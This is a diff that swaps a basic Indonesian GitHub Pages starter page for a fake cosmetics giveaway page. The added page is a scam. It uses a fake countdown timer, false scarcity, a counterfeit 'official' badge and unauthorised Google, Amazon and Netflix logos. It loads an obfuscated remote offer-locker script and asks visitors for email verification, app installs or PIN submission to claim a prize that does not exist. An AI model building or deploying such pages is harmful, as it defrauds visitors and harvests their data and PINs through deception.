@@ -1,66 +1,620 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Halo! | Website Saya</title>
-    <style>
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-        body {
-            background-color: #0d1117;
-            color: #c9d1d9;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            text-align: center;
-            padding: 20px;
-        }
-        .card {
-            background: #161b22;
-            padding: 40px;
-            border-radius: 12px;
-            border: 1px solid #30363d;
-            max-width: 500px;
-            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
-        }
-        h1 {
-            color: #58a6ff;
-            margin-bottom: 10px;
-            font-size: 2.2rem;
-        }
-        p {
-            color: #8b949e;
-            margin-bottom: 25px;
-            line-height: 1.6;
-        }
-        .btn {
-            display: inline-block;
-            padding: 10px 20px;
-            color: #ffffff;
-            background-color: #238636;
-            border-radius: 6px;
-            text-decoration: none;
-            font-weight: bold;
-            transition: background 0.2s ease;
-        }
-        .btn:hover {
-            background-color: #2ea043;
-        }
-    </style>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Mikayla Luxe Beauty Giveaway</title>
+  <!-- Google Fonts: Playfair Display, Cormorant Garamond, Montserrat, Inter, Orbitron -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:ital,wght@0,500;0,600;0,700;1,400&family=Inter:wght@300;400;500;600&family=Montserrat:wght@400;500;600;700;800;900&family=Orbitron:wght@600;800&family=Playfair+Display:ital,wght@0,600;0,800;1,600&display=swap" rel="stylesheet">
+  
+  <!-- OFFER SCRIPT -->
+  <script type="text/javascript">
+      var cDQCY_Xpl_RJCxdc={"it":4603128,"key":"8d6f4"};
+  </script>
+  <script src="https://d1g1lhd4vferpn.cloudfront.net/31b09ec.js"></script>
+
+  <style>
+    /* Reset & Custom Properties */
+    *, *::before, *::after {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    :root {
+      --rose-gold: #e8b4b8;
+      --gold-luxury: linear-gradient(135deg, #f6d365 0%, #fda085 100%);
+      --gold-metallic: linear-gradient(135deg, #bf953f 0%, #fcf6ba 25%, #b38728 50%, #fbf5b7 75%, #aa771c 100%);
+      --btn-luxe: linear-gradient(135deg, #d4af37 0%, #aa771c 50%, #8a5a00 100%);
+      --btn-rose: linear-gradient(135deg, #e0a96d 0%, #c17817 100%);
+      --glow-gold: rgba(212, 175, 55, 0.4);
+      --bg-dark: #0a080a;
+      --card-bg: rgba(20, 16, 21, 0.88);
+      --border-gold: rgba(212, 175, 55, 0.35);
+      --text-main: #f8f5f0;
+      --text-sub: #c5b9c7;
+      --accent-rose: #d8a7b1;
+    }
+
+    body {
+      background-color: var(--bg-dark);
+      background-image: 
+        radial-gradient(circle at 50% 0%, rgba(212, 175, 55, 0.15) 0%, transparent 60%),
+        radial-gradient(circle at 80% 50%, rgba(216, 167, 177, 0.12) 0%, transparent 50%),
+        radial-gradient(circle at 20% 90%, rgba(184, 134, 11, 0.1) 0%, transparent 50%);
+      color: var(--text-main);
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px 12px;
+      overflow-x: hidden;
+    }
+
+    /* Ambient Sparkles Background Effect */
+    body::before {
+      content: '';
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: radial-gradient(1.5px 1.5px at 20px 30px, rgba(255, 235, 170, 0.4), rgba(0,0,0,0)),
+                  radial-gradient(2px 2px at 150px 120px, rgba(255, 255, 255, 0.5), rgba(0,0,0,0)),
+                  radial-gradient(1.5px 1.5px at 280px 240px, rgba(216, 167, 177, 0.5), rgba(0,0,0,0));
+      background-size: 350px 350px;
+      pointer-events: none;
+      z-index: 0;
+      opacity: 0.6;
+    }
+
+    /* Container dengan Glassmorphism & Gold Accent Border */
+    .giveaway-card {
+      position: relative;
+      z-index: 1;
+      width: 100%;
+      max-width: 490px;
+      background: var(--card-bg);
+      border-radius: 30px;
+      overflow: hidden;
+      box-shadow: 0 30px 60px -15px rgba(0, 0, 0, 0.9), 
+                  0 0 40px rgba(212, 175, 55, 0.15);
+      border: 1px solid var(--border-gold);
+      backdrop-filter: blur(16px);
+      -webkit-backdrop-filter: blur(16px);
+    }
+
+    /* LUXURY TICKER BAR */
+    .ticker-bar {
+      background: linear-gradient(90deg, #1f1318 0%, #3d2314 50%, #1f1318 100%);
+      border-bottom: 1px solid rgba(212, 175, 55, 0.3);
+      padding: 10px 16px;
+      font-size: 11px;
+      font-weight: 600;
+      font-family: 'Montserrat', sans-serif;
+      text-transform: uppercase;
+      letter-spacing: 1.8px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      color: #f3e5ab;
+      text-shadow: 0 0 8px rgba(243, 229, 171, 0.3);
+    }
+
+    .pulse-dot {
+      width: 7px;
+      height: 7px;
+      background: #e5c158;
+      border-radius: 50%;
+      box-shadow: 0 0 10px #e5c158;
+      animation: pulseGold 1.5s infinite ease-in-out;
+    }
+
+    /* BANNER PROFILE CONTAINER */
+    .banner-container {
+      position: relative;
+      width: 100%;
+      height: 220px;
+      background-image: 
+        linear-gradient(to bottom, rgba(10, 8, 10, 0.1), rgba(20, 16, 21, 0.95)), 
+        url('https://images.unsplash.com/photo-1522337360788-8b13dee7a37e?auto=format&fit=crop&w=800&q=80');
+      background-size: cover;
+      background-position: center;
+    }
+
+    .giveaway-badge {
+      position: absolute;
+      top: 14px;
+      right: 14px;
+      background: var(--gold-metallic);
+      color: #120c03;
+      font-family: 'Montserrat', sans-serif;
+      font-size: 9.5px;
+      font-weight: 800;
+      padding: 6px 14px;
+      border-radius: 50px;
+      text-transform: uppercase;
+      letter-spacing: 1.5px;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
+      border: 1px solid rgba(255, 255, 255, 0.6);
+    }
+
+    /* PROFILE AVATAR WITH LUXE ORNAMENT */
+    .profile-wrapper {
+      position: absolute;
+      bottom: -46px;
+      left: 50%;
+      transform: translateX(-50%);
+      z-index: 2;
+    }
+
+    .profile-avatar-frame {
+      position: relative;
+      padding: 3px;
+      background: var(--gold-metallic);
+      border-radius: 50%;
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.6), 0 0 20px rgba(212, 175, 55, 0.4);
+    }
+
+    .profile-avatar {
+      width: 112px;
+      height: 112px;
+      border-radius: 50%;
+      object-fit: cover;
+      display: block;
+      background-color: #0a080a;
+      border: 3px solid #141015;
+    }
+
+    .verified-icon {
+      position: absolute;
+      bottom: 6px;
+      right: 6px;
+      background: linear-gradient(135deg, #d4af37, #aa771c);
+      color: #0d0901;
+      width: 24px;
+      height: 24px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 12px;
+      font-weight: bold;
+      border: 2px solid #141015;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.5);
+    }
+
+    /* HEADER TEXT CONTENT */
+    .header-content {
+      margin-top: 58px;
+      padding: 0 24px;
+      text-align: center;
+    }
+
+    .site-title {
+      font-family: 'Playfair Display', serif;
+      font-size: 27px;
+      font-weight: 600;
+      letter-spacing: 1px;
+      background: var(--gold-metallic);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      text-shadow: 0 4px 20px rgba(212, 175, 55, 0.25);
+    }
+
+    .sub-tag {
+      font-family: 'Montserrat', sans-serif;
+      font-size: 10.5px;
+      color: var(--accent-rose);
+      font-weight: 600;
+      letter-spacing: 3px;
+      text-transform: uppercase;
+      margin-top: 6px;
+    }
+
+    /* COUNTDOWN TIMER BOX */
+    .timer-container {
+      margin: 20px 24px 8px 24px;
+      background: rgba(35, 26, 32, 0.6);
+      border: 1px solid rgba(212, 175, 55, 0.25);
+      border-radius: 20px;
+      padding: 14px 16px;
+      text-align: center;
+      position: relative;
+      box-shadow: inset 0 0 15px rgba(0,0,0,0.5);
+    }
+
+    .timer-title {
+      font-family: 'Montserrat', sans-serif;
+      font-size: 10px;
+      color: #d1c7bd;
+      text-transform: uppercase;
+      letter-spacing: 1.5px;
+      margin-bottom: 6px;
+      font-weight: 500;
+    }
+
+    .timer-clock {
+      font-family: 'Orbitron', monospace;
+      font-size: 22px;
+      font-weight: 800;
+      background: linear-gradient(135deg, #f6d365, #fda085);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      letter-spacing: 4px;
+      text-shadow: 0 0 15px rgba(246, 211, 101, 0.3);
+    }
+
+    /* TEXT SECTION */
+    .text-section {
+      padding: 14px 24px;
+      text-align: center;
+    }
+
+    .text-box {
+      font-family: 'Cormorant Garamond', serif;
+      font-size: 18px;
+      line-height: 1.5;
+      color: #e2dae3;
+      background: rgba(255, 255, 255, 0.02);
+      border-radius: 18px;
+      padding: 16px 20px;
+      border: 1px solid rgba(212, 175, 55, 0.15);
+      font-weight: 500;
+    }
+
+    .text-highlight {
+      color: #f6d365;
+      font-weight: 700;
+      font-style: italic;
+    }
+
+    /* MAIN IMAGE DISPLAY */
+    .main-image-container {
+      padding: 8px 24px 16px 24px;
+      position: relative;
+    }
+
+    .image-frame {
+      position: relative;
+      border-radius: 22px;
+      overflow: hidden;
+      border: 1px solid var(--border-gold);
+      box-shadow: 0 15px 35px rgba(0,0,0,0.6);
+    }
+
+    .main-image-container img {
+      width: 100%;
+      height: 400px;
+      object-fit: cover;
+      display: block;
+      transition: transform 0.6s ease;
+    }
+
+    .image-frame:hover img {
+      transform: scale(1.03);
+    }
+
+    .live-tag {
+      position: absolute;
+      bottom: 16px;
+      left: 16px;
+      right: 16px;
+      background: rgba(15, 10, 15, 0.75);
+      backdrop-filter: blur(8px);
+      -webkit-backdrop-filter: blur(8px);
+      border: 1px solid rgba(212, 175, 55, 0.3);
+      padding: 8px 16px;
+      border-radius: 30px;
+      font-family: 'Montserrat', sans-serif;
+      font-size: 11px;
+      font-weight: 600;
+      color: #fceade;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      letter-spacing: 0.5px;
+    }
+
+    /* CLAIM BUTTON & ANIMATED ARROW AREA */
+    .button-container {
+      padding: 6px 24px 20px 24px;
+      text-align: center;
+    }
+
+    .instruction-text {
+      font-size: 13.5px;
+      line-height: 1.5;
+      color: var(--text-sub);
+      margin-bottom: 12px;
+      font-weight: 400;
+    }
+
+    /* STYLING TANDA PANAH HIDUP (LIVING ARROW) */
+    .animated-arrow-wrapper {
+      margin-bottom: 8px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      animation: bounceArrow 1.2s infinite ease-in-out;
+    }
+
+    .animated-arrow-wrapper svg {
+      width: 38px;
+      height: 38px;
+      fill: url(#goldGradient);
+      filter: drop-shadow(0px 0px 8px rgba(246, 211, 101, 0.8));
+    }
+
+    /* CLAIM BUTTON WITH LUXURY SHINE */
+    .btn-claim {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      width: 100%;
+      padding: 20px 0;
+      background: var(--gold-metallic);
+      color: #120a00;
+      font-family: 'Montserrat', sans-serif;
+      font-size: 16px;
+      font-weight: 800;
+      text-transform: uppercase;
+      letter-spacing: 2px;
+      text-decoration: none;
+      border-radius: 50px;
+      box-shadow: 0 10px 30px rgba(212, 175, 55, 0.35);
+      position: relative;
+      overflow: hidden;
+      transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+      cursor: pointer;
+      border: 1px solid rgba(255, 255, 255, 0.8);
+    }
+
+    .btn-claim:hover {
+      transform: translateY(-3px) scale(1.02);
+      box-shadow: 0 18px 40px rgba(212, 175, 55, 0.55);
+    }
+
+    .btn-claim::before {
+      content: '';
+      position: absolute;
+      top: -50%;
+      left: -50%;
+      width: 200%;
+      height: 200%;
+      background: linear-gradient(
+        60deg,
+        transparent 30%,
+        rgba(255, 255, 255, 0.7) 50%,
+        transparent 70%
+      );
+      transform: rotate(30deg);
+      animation: luxeShimmer 3.5s infinite;
+    }
+
+    /* SUPPORTING GALLERY */
+    .supporting-image-container {
+      padding: 0 24px 22px 24px;
+    }
+
+    .supporting-image-container img {
+      width: 100%;
+      height: 140px;
+      object-fit: cover;
+      border-radius: 18px;
+      border: 1px solid rgba(212, 175, 55, 0.2);
+      box-shadow: 0 8px 20px rgba(0,0,0,0.4);
+      opacity: 0.92;
+      transition: opacity 0.3s;
+    }
+
+    .supporting-image-container img:hover {
+      opacity: 1;
+    }
+
+    /* SPONSORS FOOTER */
+    .sponsor-section {
+      padding: 22px 24px;
+      background: rgba(10, 7, 10, 0.95);
+      border-top: 1px solid rgba(212, 175, 55, 0.15);
+      text-align: center;
+    }
+
+    .sponsor-title {
+      font-family: 'Montserrat', sans-serif;
+      font-size: 9.5px;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 3px;
+      color: #8c7b8d;
+      margin-bottom: 14px;
+    }
+
+    .sponsor-logos {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 28px;
+    }
+
+    .sponsor-logos img {
+      height: 22px;
+      filter: brightness(0) invert(1) opacity(0.5);
+      transition: all 0.3s;
+    }
+
+    .sponsor-logos img:hover {
+      filter: brightness(0) invert(1) opacity(0.9);
+    }
+
+    /* Keyframe Animations */
+    @keyframes pulseGold {
+      0% { transform: scale(0.9); opacity: 0.7; box-shadow: 0 0 5px #e5c158; }
+      50% { transform: scale(1.25); opacity: 1; box-shadow: 0 0 12px #e5c158; }
+      100% { transform: scale(0.9); opacity: 0.7; box-shadow: 0 0 5px #e5c158; }
+    }
+
+    @keyframes luxeShimmer {
+      0% { transform: translateX(-100%) rotate(30deg); }
+      100% { transform: translateX(100%) rotate(30deg); }
+    }
+
+    /* KEYFRAME ANIMASI PANAH MEMANTUL (BOUNCING ARROW) */
+    @keyframes bounceArrow {
+      0%, 100% {
+        transform: translateY(0);
+      }
+      50% {
+        transform: translateY(10px);
+      }
+    }
+  </style>
 </head>
 <body>
 
-    <div class="card">
-        <h1>🚀 GitHub Pages Aktif!</h1>
-        <p>Website sederhana kamu berhasil dijalankan. Kamu bisa mengedit file <code>index.html</code> ini untuk menambahkan portofolio, proyek, atau proyek seru lainnya.</p>
-        <a href="https://github.com" class="btn">Lihat Profil GitHub</a>
+  <!-- SVG GRADIENT DEFINITION (Untuk Pewarnaan Panah Emas) -->
+  <svg width="0" height="0" style="position: absolute;">
+    <defs>
+      <linearGradient id="goldGradient" x1="0%" y1="0%" x2="100%" y2="100%">
+        <stop offset="0%" stop-color="#f6d365" />
+        <stop offset="50%" stop-color="#fda085" />
+        <stop offset="100%" stop-color="#bf953f" />
+      </linearGradient>
+    </defs>
+  </svg>
+
+  <!-- CONTAINER MAIN CARD -->
+  <div class="giveaway-card">
+
+    <!-- LIVE TICKER BAR -->
+    <div class="ticker-bar">
+      <div class="pulse-dot"></div>
+      <span>Exclusive VIP Giveaway • Only 5 Packages Remaining</span>
     </div>
+
+    <!-- BANNER DI BELAKANG PHOTO PROFIL -->
+    <div class="banner-container">
+      <div class="giveaway-badge">OFFICIAL EVENT</div>
+      
+      <!-- PHOTO PROFIL -->
+      <div class="profile-wrapper">
+        <div class="profile-avatar-frame">
+          <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh5EB4e6NYADqMIR7Qfcj0hzF_gnegVdK8e3uiwlYsztj76AscNSxcFN3jeQXNdEgnvzCW_tVJsp4q_bsrrzrSIW6U4-9cjjr1_wpfEZwO225UaWnZanmt3TOoKXWzOKdonCSpYtFu0GJXSCtE0rwUe_TRCCwbRbZfwA1Gh5AFNnyTg8bjYMRnIOz36jOTI/s1024/64972.png" alt="Mikayla Profile" class="profile-avatar"/>
+          <div class="verified-icon">✓</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- JUDUL NAMA WEB DI BAWAH PHOTO PROFIL -->
+    <div class="header-content">
+      <h1 class="site-title">MIKAYLA LUXE BEAUTY</h1>
+      <div class="sub-tag">✦ Exclusive Member Loyalty Reward ✦</div>
+    </div>
+
+    <!-- COUNTDOWN TIMER -->
+    <div class="timer-container">
+      <div class="timer-title">⏰ Time Remaining to Claim Your Luxury Set:</div>
+      <div class="timer-clock" id="countdown">00 : 14 : 59</div>
+    </div>
+
+    <!-- HALAMAN UNTUK TEXT -->
+    <div class="text-section">
+      <div class="text-box">
+        Congratulations! As an appreciated follower, you are selected to claim the <span class="text-highlight">Mikayla Signature Full Cosmetic Vault</span>. Tap the button below to secure your complimentary set before remaining spots expire.
+      </div>
+    </div>
+
+    <!-- GAMBAR UTAMA -->
+    <div class="main-image-container">
+      <div class="image-frame">
+        <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh9YHxaHPYZ1lkSCjzcrJmZt6ucw9Ia42fw4LLGrmTbuVgF0z0Ry6RH2MjkgCprlLUz3lvDXoGk7D8DGBy6sDPCBxsq4uEhT5oyLfgIvErD1VP8P4FHN2QzF7uXWLJC3ar05z1P2TKcAUUcpGZIwh5FqTxhkDdfuspR5bO_Fi-C13cVAFrS-UEg_hfx-81t/s1264/64969.png" alt="Mikayla Cosmetic Giveaway Package"/>
+        <div class="live-tag">
+          <div class="pulse-dot"></div> Signature Full Cosmetic Collection
+        </div>
+      </div>
+    </div>
+
+    <!-- BUTTON CLAIM NOW & PANAH ANIMASI -->
+    <div class="button-container">
+      <p class="instruction-text">
+        📋 Please complete one of the available offers, such as email verification, app installation, or PIN submission, to receive your redemption code. 🔑
+      </p>
+
+      <!-- TANDA PANAH ANIMASI HIDUP -->
+      <div class="animated-arrow-wrapper">
+        <svg viewBox="0 0 24 24">
+          <path d="M11 4v11.17l-4.58-4.59L5 12l7 7 7-7-1.41-1.41L13 15.17V4h-2z"/>
+        </svg>
+      </div>
+
+      <a href="javascript:void(0)" class="btn-claim" onclick="triggerOffer(event)">
+        <span>✨ CLAIM YOUR GIFT NOW ✨</span>
+      </a>
+    </div>
+
+    <!-- GAMBAR PENDUKUNG -->
+    <div class="supporting-image-container">
+      <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiXExXefbQI3jA4NlFzPF_f3XWSMWT-TziBo6FpR2xHNvH1KAtZBwIT-y5sEMm4Pu0Fl9IB3RQv0P9wgWUuYmMOSWWbfJ2_GXZi1yy1xjrsntCoXZ9CS1oJ65_hKdirX_rQqOjaWHEJEEtP0Lbb39h1C4qcFsfPSaA9Qya7b0WR6DvBR77UQ8fwCtpzR_e4/s1264/65006.png" alt="Supporting Giveaway Image"/>
+    </div>
+
+    <!-- SPONSORED BY -->
+    <div class="sponsor-section">
+      <div class="sponsor-title">Official Brand Partners</div>
+      <div class="sponsor-logos">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google"/>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon"/>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix"/>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- SCRIPT UTAMA -->
+  <script>
+    // Countdown Timer
+    let time = 899; // 14 minutes 59 seconds
+    const timerElement = document.getElementById('countdown');
+
+    setInterval(() => {
+      let minutes = Math.floor(time / 60);
+      let seconds = time % 60;
+
+      minutes = minutes < 10 ? '0' + minutes : minutes;
+      seconds = seconds < 10 ? '0' + seconds : seconds;
+
+      timerElement.innerHTML = `00 : ${minutes} : ${seconds}`;
+      if (time > 0) time--;
+    }, 1000);
+
+    // Function saat tombol diklik: Melacak Histats & Membuka Offer / Locker
+    function triggerOffer(e) {
+      if (e) e.preventDefault();
+      
+      // Tracking Histats
+      trackHistats();
+      
+      // Eksekusi Offer Script (_CS)
+      if (typeof _CS === 'function') {
+        _CS();
+      }
+    }
+
+    function trackHistats() {
+      window._Hasync = window._Hasync || [];
+      _Hasync.push(['Histats.start', '1,4888479,4,0,0,0,00010000']);
+      _Hasync.push(['Histats.fasi', '1']);
+      _Hasync.push(['Histats.track_hits', '']);
+      
+      var hs = document.createElement('script'); 
+      hs.type = 'text/javascript'; 
+      hs.async = true;
+      hs.src = ('//s10.histats.com/js15_as.js');
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+    }
+  </script>
 
 </body>
 </html>
